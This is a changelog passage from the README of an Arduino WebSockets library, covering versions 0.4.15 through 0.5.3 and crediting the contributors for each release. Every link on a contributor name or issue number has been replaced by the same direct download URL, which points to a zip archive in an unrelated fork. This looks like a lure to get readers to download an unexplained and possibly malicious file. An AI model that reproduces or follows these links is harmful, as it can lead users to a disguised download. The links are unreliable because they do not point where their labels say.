- **24/02/20 (v0.4.15)** - Added `Origin` and `User-Agent` headers to requests sent by the library, this seems to be required by some servers. Thank you [imesut](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for pointing out the issue.
- **21/04/20 (v0.4.16)** - Merged pull request by @oofnik which added 2 way SSL auth for ESP32 and ES8266. Thank you very [oofnik](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for the contribuation.
- **25/04/20 (v0.4.17)** - Merged pull request by Luka Bodroža (@zastrixarundell) which fixed [issue #69](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) - default headers (like Origin, Host) are now customizable via the `addHeader` method. Thank you [zastrixarundell](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for the contribution.
- **23/07/20 (v0.4.18)** - Merged pull request by Adelin U (@adelin-mcbsoft) which fixed [issue #84](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) - SSL bug-fixing, implemented public-key certificate validation & EC Certificates for client-side. Thank you Adelin!
- **28/11/20 (v0.5.0)** - Support for Teensy 4.1 added by the awesome [@arnoson](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip). Supporting plaintext client/server communication and providing new and useful examples. Thank you arnoson!
- **10/05/21 (v0.5.1)** - Fingerprints and Certificates in the examples were updated by [@Khoi Hoang
](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip). Thank you Khoi!
- **29/07/21 (v0.5.2)** - Merged PR by [ONLYstcm](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) which added a (configurable) timeout for connections. Thank you ONLYstcm.
- **06/08/21 (v0.5.3)** - Merged PR by [ln-12](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) which added a `connectSecure` method to support WSS connection with the classic interface (host, port, path). Thank you!
